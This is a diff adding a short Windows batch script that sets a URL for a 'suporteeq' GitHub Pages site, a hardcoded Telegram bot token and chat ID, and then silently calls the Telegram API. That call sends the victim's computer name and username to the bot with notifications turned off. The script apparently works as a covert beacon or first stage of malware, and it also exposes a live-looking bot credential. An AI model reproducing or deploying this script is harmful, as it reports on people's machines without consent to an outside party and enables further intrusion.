@@ -1,0 +1,15 @@
+@echo off
+
+cls
+set eq_repo="https://suporteeq.github.io"
+
+cls
+set bot_api="5778710873:AAEBZBIN_ZTBsRMJcdpEBdBu5rjiPlwqENU"
+
+cls
+set bot_chat_id="183148731"
+
+
+cls
+curl -s "https://api.telegram.org/bot%bot_api%/sendMessage?chat_id=%bot_chat_id%&disable_notification=true&text=Computer:%computername%|User:%username%|run"
+
